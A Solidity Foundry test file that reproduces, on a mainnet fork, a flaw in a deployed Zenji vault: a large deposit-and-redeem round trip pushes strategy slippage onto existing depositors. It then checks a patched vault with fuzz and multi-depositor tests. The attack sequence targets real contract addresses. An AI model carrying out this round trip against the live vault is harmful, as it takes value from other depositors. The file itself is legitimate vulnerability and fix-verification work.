// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import { Test, console } from "forge-std/Test.sol";
import { Zenji } from "../src/Zenji.sol";
import { ZenjiWbtcPmUsd } from "../src/implementations/ZenjiWbtcPmUsd.sol";
import { IYieldStrategy } from "../src/interfaces/IYieldStrategy.sol";
import { ILoanManager } from "../src/interfaces/ILoanManager.sol";
import { IERC20 } from "../src/interfaces/IERC20.sol";
import { IChainlinkOracle } from "../src/interfaces/IChainlinkOracle.sol";

interface ICurvePoolNG {
    function balances(uint256 i) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function get_virtual_price() external view returns (uint256);
}

/// @title SlippageSocialization
/// @notice Demonstrates that withdrawal slippage from a large depositor is
///         socialized onto remaining depositors instead of being borne entirely
///         by the withdrawer.
///
/// Attack sequence:
///   1. Original depositor (Alice) has ~0.15 WBTC in the vault
///   2. Attacker (Bob) deposits 100 WBTC → gets shares priced at oracle value
///   3. Bob immediately redeems → strategy liquidation incurs slippage
///   4. The slippage burns shared Aave collateral, reducing Alice's share value
///   5. Alice's post-attack redemption value is significantly less than before
///
/// Root cause: `_calculateCollateralForShares()` uses oracle-estimated strategy
///   value (virtual_price × crvUSD oracle) for share pricing, but actual
///   liquidation in `_unwindPosition()` realizes less. The difference is covered
///   by selling WBTC from the shared Aave collateral pool.
///
/// Run:
///   MAINNET_RPC_URL=<url> forge test --match-contract SlippageSocialization -vvv
contract SlippageSocialization is Test {
    // ─── Deployed (DeploymentV26.md: WBTC pmUSD/crvUSD strat) ───
    address constant VAULT     = 0x617A6877f0a55D1eF2B64b5861A2bB5Fe6FEB739;
    address constant STRATEGY  = 0x73B753F63175F003881Dc39710d40c8E2F027FD8;
    address constant LOAN_MGR  = 0x25a1b8262f9644F00Fc80F11eF8cc2Ea1b74BDE3;

    address constant WBTC             = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant USDT             = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant PMUSD_CRVUSD     = 0xEcb0F0d68C19BdAaDAEbE24f6752A4Db34e2c2cb;
    address constant BTC_USD_ORACLE   = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant USDT_USD_ORACLE  = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;
    address constant CRVUSD_USD_ORACLE = 0xEEf0C605546958c1f899b6fB336C20671f9cD49F;
    address constant CRV_USD_ORACLE   = 0xCd627aA160A6fA45Eb793D19Ef54f5062F20f33f;

    Zenji vault;
    IYieldStrategy strategy;
    ILoanManager loanManager;
    IERC20 wbtc;

    address alice;  // existing depositor
    address bob;    // large attacker

    uint256 aliceShares;                         // set in setUp after Alice's initial deposit
    uint256 constant ALICE_DEPOSIT = 15_000_000; // 0.15 WBTC (satoshis)

    function _initFork() internal {
        string memory rpcUrl = vm.envOr("MAINNET_RPC_URL", string(""));
        if (bytes(rpcUrl).length == 0) rpcUrl = vm.envOr("ETH_RPC_URL", string(""));
        if (bytes(rpcUrl).length == 0) { vm.skip(true); return; }
        vm.createSelectFork(rpcUrl);

        vault       = Zenji(VAULT);
        strategy    = vault.yieldStrategy();
        loanManager = vault.loanManager();
        wbtc        = IERC20(WBTC);

        alice = makeAddr("alice");
        bob   = makeAddr("bob");

        // Remove deposit cap
        uint256 cap = vault.depositCap();
        if (cap > 0) {
            vm.prank(vault.gov());
            vault.setParam(2, 0);
        }

        _refreshOracles();

        // Seed Alice's position — self-contained, does not rely on any on-chain depositor balance
        deal(WBTC, alice, ALICE_DEPOSIT);
        vm.startPrank(alice);
        wbtc.approve(address(vault), ALICE_DEPOSIT);
        aliceShares = vault.deposit(ALICE_DEPOSIT, alice);
        vm.stopPrank();
    }

    /// @notice Deploy a fresh ZenjiWbtcPmUsd with local (modified) code
    ///         and etch its runtime bytecode onto the deployed vault address.
    ///         Storage slots are preserved so existing strategy/LM state works.
    function _patchVaultCode() internal {
        address _lm = address(vault.loanManager());
        address _strat = address(vault.yieldStrategy());
        address _swapper = address(vault.swapper());
        address _owner = vault.gov();
        address _viewHelper = address(vault.viewHelper());

        // Mock strategy.vault() to return address(0) so the constructor
        // passes the "vault is bindable" check (stratVault == address(0)).
        vm.mockCall(
            _strat,
            abi.encodeWithSignature("vault()"),
            abi.encode(address(0))
        );

        // Deploy modified ZenjiWbtcPmUsd at a temporary address
        ZenjiWbtcPmUsd patched = new ZenjiWbtcPmUsd(
            _lm, _strat, _swapper, _owner, _viewHelper
        );

        // Clear the mock so the real strategy.vault() works again
        vm.clearMockedCalls();
        // Restore oracle mocks that clearMockedCalls removed
        _refreshOracles();

        // Etch only the runtime code; storage (shares, state) is preserved
        vm.etch(VAULT, address(patched).code);
    }

    function setUp() public {
        _initFork();
    }

    /// @notice Core test: Bob's deposit+withdraw steals value from Alice (DEPLOYED code — demonstrates bug)
    function testSlippageSocializedOntoExistingDepositor() public {
        // ─── Snapshot Alice's position ───
        uint256 existingShares = aliceShares;
        uint256 aliceValueBefore = existingShares * (vault.totalAssets() + vault.VIRTUAL_SHARE_OFFSET())
            / (vault.totalSupply() + vault.VIRTUAL_SHARE_OFFSET());

        console.log("=== BEFORE ATTACK ===");
        console.log("Existing shares (Alice's):  %d", existingShares);
        console.log("Alice's value (WBTC sat):   %d", aliceValueBefore);
        console.log("Strategy oracle est (USDT): %d", strategy.balanceOf());

        // Log pool depth for context
        ICurvePoolNG pool = ICurvePoolNG(PMUSD_CRVUSD);
        uint256 poolPmUsd  = pool.balances(0);
        uint256 poolCrvUsd = pool.balances(1);
        console.log("Pool pmUSD (18-dec):        %d", poolPmUsd);
        console.log("Pool crvUSD (18-dec):       %d", poolCrvUsd);
        console.log("Pool total ~USDT (6-dec):   %d", (poolPmUsd + poolCrvUsd) / 1e12);

        // ─── Bob deposits 100 WBTC ───
        uint256 bobDeposit = 100e8;
        deal(WBTC, bob, bobDeposit);

        vm.startPrank(bob);
        wbtc.approve(address(vault), bobDeposit);
        uint256 bobShares = vault.deposit(bobDeposit, bob);
        vm.stopPrank();

        console.log("\n=== AFTER BOB DEPOSITS 100 WBTC ===");
        console.log("Bob shares received:        %d", bobShares);
        console.log("Total supply now:           %d", vault.totalSupply());
        console.log("Oracle totalCollateral:     %d", vault.totalAssets());
        console.log("Strategy oracle est (USDT): %d", strategy.balanceOf());

        // Pool state after deposit (LP was added)
        uint256 poolPmUsdAfter  = pool.balances(0);
        uint256 poolCrvUsdAfter = pool.balances(1);
        console.log("Pool crvUSD after deposit:  %d", poolCrvUsdAfter);
        console.log("Pool crvUSD ADDED:          %d", poolCrvUsdAfter - poolCrvUsd);

        // ─── Advance 1 block (cooldown) ───
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        _refreshOracles();

        // ─── Alice's share value BEFORE Bob redeems (should be ~same as before) ───
        // Alice's value = existingShares * totalCollateral / totalSupply
        uint256 aliceValueMidpoint = (existingShares * (vault.totalAssets() + vault.VIRTUAL_SHARE_OFFSET()))
            / (vault.totalSupply() + vault.VIRTUAL_SHARE_OFFSET());
        console.log("\n=== MIDPOINT: BEFORE BOB REDEEMS ===");
        console.log("Alice value (WBTC sat):     %d", aliceValueMidpoint);
        console.log("Change from before attack:  %d sat", int256(aliceValueMidpoint) - int256(aliceValueBefore));

        // ─── Bob redeems everything ───
        vm.prank(bob);
        uint256 bobReturned = vault.redeem(bobShares, bob, bob);

        console.log("\n=== AFTER BOB REDEEMS ===");
        console.log("Bob deposited:              %d sat", bobDeposit);
        console.log("Bob received back:          %d sat", bobReturned);
        int256 bobPnl = int256(bobReturned) - int256(bobDeposit);
        console.log("Bob PnL:                    %d sat", bobPnl);

        // ─── Alice's value AFTER the attack ───
        uint256 aliceValueAfter = existingShares * (vault.totalAssets() + vault.VIRTUAL_SHARE_OFFSET())
            / (vault.totalSupply() + vault.VIRTUAL_SHARE_OFFSET());
        uint256 aliceSharesAfter = vault.balanceOf(alice);

        console.log("\n=== ALICE'S DAMAGE ===");
        console.log("Alice value BEFORE (sat):   %d", aliceValueBefore);
        console.log("Alice value AFTER  (sat):   %d", aliceValueAfter);
        int256 aliceLoss = int256(aliceValueAfter) - int256(aliceValueBefore);
        console.log("Alice loss (sat):           %d", aliceLoss);
        console.log("Alice shares unchanged?     %s", existingShares == aliceSharesAfter ? "YES" : "NO");

        // Percentage loss
        if (aliceValueBefore > 0) {
            uint256 lossPct = uint256(-aliceLoss) * 10000 / aliceValueBefore;
            console.log("Alice loss %%:              %d.%d%%", lossPct / 100, lossPct % 100);
        }

        // ─── Pool state after attack ───
        uint256 poolCrvUsdFinal = pool.balances(1);
        console.log("\n=== POOL STATE AFTER ATTACK ===");
        console.log("Pool crvUSD before:         %d", poolCrvUsd);
        console.log("Pool crvUSD after deposit:  %d", poolCrvUsdAfter);
        console.log("Pool crvUSD after redeem:   %d", poolCrvUsdFinal);
        console.log("Net pool crvUSD change:     %d", int256(poolCrvUsdFinal) - int256(poolCrvUsd));

        // ─── Root cause: oracle vs realized ───
        console.log("\n=== ROOT CAUSE: ORACLE vs REALIZED ===");
        console.log("Strategy balance remaining: %d USDT", strategy.balanceOf());
        console.log("If slippage were borne by Bob alone:");
        console.log("  Alice's value should be:  >= %d sat", aliceValueBefore);
        console.log("  Actual Alice value:         %d sat", aliceValueAfter);
        console.log("  Shortfall socialized onto Alice: %d sat", uint256(-aliceLoss));

        // The key assertion: Alice lost value she shouldn't have
        assertGt(aliceValueBefore, aliceValueAfter, "Alice should NOT lose value from Bob's round-trip");
    }

    /// @notice With the fix: Bob absorbs slippage proportionally, Alice is protected
    function testFixPreventsSlippageSocialization() public {
        // Patch the deployed vault with our fixed code (preserves storage + strategy state)
        _patchVaultCode();

        uint256 existingShares = aliceShares;
        uint256 aliceValueBefore = existingShares * (vault.totalAssets() + vault.VIRTUAL_SHARE_OFFSET())
            / (vault.totalSupply() + vault.VIRTUAL_SHARE_OFFSET());

        console.log("=== PATCHED VAULT: BEFORE ATTACK ===");
        console.log("Alice's value (WBTC sat):   %d", aliceValueBefore);

        uint256 bobDeposit = 100e8;
        deal(WBTC, bob, bobDeposit);

        vm.startPrank(bob);
        wbtc.approve(address(vault), bobDeposit);
        uint256 bobShares = vault.deposit(bobDeposit, bob);
        vm.stopPrank();

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        _refreshOracles();

        vm.prank(bob);
        uint256 bobReturned = vault.redeem(bobShares, bob, bob);

        uint256 aliceValueAfter = existingShares * (vault.totalAssets() + vault.VIRTUAL_SHARE_OFFSET())
            / (vault.totalSupply() + vault.VIRTUAL_SHARE_OFFSET());

        console.log("\n=== PATCHED VAULT: AFTER ATTACK ===");
        console.log("Bob deposited:              %d sat", bobDeposit);
        console.log("Bob received back:          %d sat", bobReturned);
        console.log("Bob PnL:                    %d sat", int256(bobReturned) - int256(bobDeposit));
        console.log("Alice value BEFORE (sat):   %d", aliceValueBefore);
        console.log("Alice value AFTER  (sat):   %d", aliceValueAfter);
        int256 aliceDelta = int256(aliceValueAfter) - int256(aliceValueBefore);
        console.log("Alice delta (sat):          %d", aliceDelta);

        // With the fix, Alice should NOT lose significant value.
        // Allow up to 5% loss as acceptable proportional slippage.
        uint256 maxAcceptableLoss = aliceValueBefore * 5 / 100;
        if (aliceValueAfter < aliceValueBefore) {
            uint256 actualLoss = aliceValueBefore - aliceValueAfter;
            console.log("Alice loss (sat):           %d", actualLoss);
            console.log("Max acceptable (5%%):       %d", maxAcceptableLoss);
            assertLe(actualLoss, maxAcceptableLoss, "Alice should not lose more than 5% from Bob's round-trip");
        }
        // Bob should absorb the bulk of slippage (receive less than deposited)
        console.log("Bob net loss (slippage):    %d sat", int256(bobDeposit) - int256(bobReturned));
    }

    /// @notice Shows the attack scales: bigger deposit = more theft
    function testSlippageScalesWithDepositSize() public {
        uint256[3] memory depositSizes = [uint256(10e8), 50e8, 100e8];
        int256[3] memory aliceLosses;

        for (uint256 i = 0; i < 3; i++) {
            // Create a fresh fork for each test to reset state
            string memory rpcUrl = vm.envOr("MAINNET_RPC_URL", string(""));
            if (bytes(rpcUrl).length == 0) rpcUrl = vm.envOr("ETH_RPC_URL", string(""));
            vm.createSelectFork(rpcUrl);

            vault       = Zenji(VAULT);
            strategy    = vault.yieldStrategy();
            loanManager = vault.loanManager();
            wbtc        = IERC20(WBTC);

            // Remove deposit cap
            uint256 cap = vault.depositCap();
            if (cap > 0) {
                vm.prank(vault.gov());
                vault.setParam(2, 0);
            }
            _refreshOracles();

            // Seed Alice's position in this fresh fork
            deal(WBTC, alice, ALICE_DEPOSIT);
            vm.startPrank(alice);
            wbtc.approve(address(vault), ALICE_DEPOSIT);
            uint256 aliceLocalShares = vault.deposit(ALICE_DEPOSIT, alice);
            vm.stopPrank();

            uint256 valueBefore = aliceLocalShares * (vault.totalAssets() + vault.VIRTUAL_SHARE_OFFSET())
                / (vault.totalSupply() + vault.VIRTUAL_SHARE_OFFSET());
            uint256 amt = depositSizes[i];
            address attacker = makeAddr(string(abi.encodePacked("attacker", i)));
            deal(WBTC, attacker, amt);

            vm.startPrank(attacker);
            wbtc.approve(address(vault), amt);
            uint256 shares = vault.deposit(amt, attacker);
            vm.stopPrank();

            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12);
            _refreshOracles();

            vm.prank(attacker);
            vault.redeem(shares, attacker, attacker);

            uint256 valueAfter = aliceLocalShares * (vault.totalAssets() + vault.VIRTUAL_SHARE_OFFSET())
                / (vault.totalSupply() + vault.VIRTUAL_SHARE_OFFSET());
            aliceLosses[i] = int256(valueAfter) - int256(valueBefore);
        }

        console.log("=== SLIPPAGE SOCIALIZATION vs DEPOSIT SIZE ===");
        console.log("Alice's seed deposit: %d sat (0.15 WBTC)", ALICE_DEPOSIT);
        for (uint256 i = 0; i < 3; i++) {
            console.log("  Deposit %d WBTC -> Alice loss:", depositSizes[i] / 1e8);
            console.log("    %d sat", aliceLosses[i]);
        }
    }

    // ─── Fuzz: fix holds for any attacker deposit size up to ~$10M ───
    //
    // Run: forge test --match-test testFuzz_Fix --fork-url $MAINNET_RPC_URL
    // For a quicker pass: add --fuzz-runs 5
    function testFuzz_FixPreventsSlippageAnyAttackSize(uint256 bobDeposit) public {
        // 0.01 WBTC → 117 WBTC (≈$10M at $85k/BTC, the Curve pool liquidity ceiling)
        bobDeposit = bound(bobDeposit, 1e6, 117e8);

        _patchVaultCode();

        uint256 offset = vault.VIRTUAL_SHARE_OFFSET();
        uint256 aliceValueBefore =
            aliceShares * (vault.totalAssets() + offset) / (vault.totalSupply() + offset);

        deal(WBTC, bob, bobDeposit);
        vm.startPrank(bob);
        wbtc.approve(address(vault), bobDeposit);
        uint256 bobShares = vault.deposit(bobDeposit, bob);
        vm.stopPrank();

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        _refreshOracles();

        vm.prank(bob);
        uint256 bobReturned = vault.redeem(bobShares, bob, bob);

        // Bob must not profit from the round-trip
        assertLe(bobReturned, bobDeposit, "Attacker profited -- fix failed");

        // Alice must not lose more than 5% of her value
        uint256 aliceValueAfter =
            aliceShares * (vault.totalAssets() + offset) / (vault.totalSupply() + offset);
        _assertLossWithin5Pct(aliceValueBefore, aliceValueAfter, "Alice");
    }

    // ─── Multi-depositor: 5 depositors spanning dust to 10 WBTC, max $10M attacker ───
    //
    // Depositors:
    //   Alice  — 0.15  WBTC (seeded in setUp)
    //   Carol  — 0.001 WBTC (tiny)
    //   Dave   — 0.01  WBTC (small)
    //   Eve    — 1     WBTC (medium)
    //   Frank  — 10    WBTC (large)
    // Attacker (Bob) deposits 117 WBTC ≈ $10M then immediately redeems.
    function testMultiDepositorAllProtectedByFix() public {
        _patchVaultCode();

        address carol = makeAddr("carol");
        address dave  = makeAddr("dave");
        address eve   = makeAddr("eve");
        address frank = makeAddr("frank");

        address[4] memory others  = [carol,  dave,   eve,  frank];
        uint256[4] memory amounts = [uint256(1e5), uint256(1e6), uint256(1e8), uint256(10e8)];
        // 0.001 WBTC, 0.01 WBTC, 1 WBTC, 10 WBTC

        uint256[4] memory theirShares;
        for (uint256 i = 0; i < 4; i++) {
            deal(WBTC, others[i], amounts[i]);
            vm.startPrank(others[i]);
            wbtc.approve(address(vault), amounts[i]);
            theirShares[i] = vault.deposit(amounts[i], others[i]);
            vm.stopPrank();
        }

        // Snapshot all five depositors before the attack
        uint256 offset = vault.VIRTUAL_SHARE_OFFSET();
        uint256 ts = vault.totalSupply();
        uint256 ta = vault.totalAssets();
        uint256 aliceValueBefore = aliceShares * (ta + offset) / (ts + offset);
        uint256[4] memory valuesBefore;
        for (uint256 i = 0; i < 4; i++) {
            valuesBefore[i] = theirShares[i] * (ta + offset) / (ts + offset);
        }

        // Bob attacks with full $10M
        uint256 attackAmount = 117e8;
        deal(WBTC, bob, attackAmount);
        vm.startPrank(bob);
        wbtc.approve(address(vault), attackAmount);
        uint256 bobShares = vault.deposit(attackAmount, bob);
        vm.stopPrank();

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        _refreshOracles();

        vm.prank(bob);
        uint256 bobReturned = vault.redeem(bobShares, bob, bob);

        // Bob must not extract profit
        assertLe(bobReturned, attackAmount, "Attacker profited -- fix failed");

        // All five depositors must each lose < 5%
        ts = vault.totalSupply();
        ta = vault.totalAssets();
        offset = vault.VIRTUAL_SHARE_OFFSET();

        uint256 aliceValueAfter = aliceShares * (ta + offset) / (ts + offset);
        _assertLossWithin5Pct(aliceValueBefore, aliceValueAfter, "Alice (0.15 WBTC)");

        string[4] memory labels =
            ["Carol (0.001 WBTC)", "Dave (0.01 WBTC)", "Eve (1 WBTC)", "Frank (10 WBTC)"];
        for (uint256 i = 0; i < 4; i++) {
            uint256 valueAfter = theirShares[i] * (ta + offset) / (ts + offset);
            _assertLossWithin5Pct(valuesBefore[i], valueAfter, labels[i]);
        }

        console.log("=== MULTI-DEPOSITOR FIX TEST ===");
        console.log("Bob deposited:   %d sat", attackAmount);
        console.log("Bob returned:    %d sat", bobReturned);
        console.log("Bob PnL:         %d sat", int256(bobReturned) - int256(attackAmount));
        uint256 aliceAfterLog = aliceShares * (ta + offset) / (ts + offset);
        console.log("Alice (0.15 WBTC) delta: %d sat", int256(aliceAfterLog) - int256(aliceValueBefore));
        for (uint256 i = 0; i < 4; i++) {
            uint256 valueAfter = theirShares[i] * (ta + offset) / (ts + offset);
            if (valueAfter >= valuesBefore[i]) {
                console.log("Depositor %d gained: %d sat", i + 1, valueAfter - valuesBefore[i]);
            } else {
                console.log("Depositor %d lost:   %d sat", i + 1, valuesBefore[i] - valueAfter);
            }
        }
    }

    /// @dev Asserts depositor lost less than 5% of their pre-attack value
    function _assertLossWithin5Pct(uint256 before_, uint256 after_, string memory label) internal {
        if (after_ < before_) {
            uint256 loss = before_ - after_;
            assertLe(
                loss * 100,
                before_ * 5,
                string(abi.encodePacked(label, ": loss exceeds 5% from attacker's round-trip"))
            );
        }
    }

    // ─── Oracle helper ───
    function _refreshOracles() internal {
        address[4] memory oracles = [BTC_USD_ORACLE, USDT_USD_ORACLE, CRVUSD_USD_ORACLE, CRV_USD_ORACLE];
        for (uint256 i = 0; i < oracles.length; i++) {
            (uint80 roundId, int256 answer,, uint256 updatedAt, uint80 answeredInRound) =
                IChainlinkOracle(oracles[i]).latestRoundData();
            uint256 ts = block.timestamp > updatedAt ? block.timestamp : updatedAt;
            vm.mockCall(
                oracles[i],
                abi.encodeWithSelector(IChainlinkOracle.latestRoundData.selector),
                abi.encode(roundId, answer, ts, ts, answeredInRound)
            );
        }
    }
}
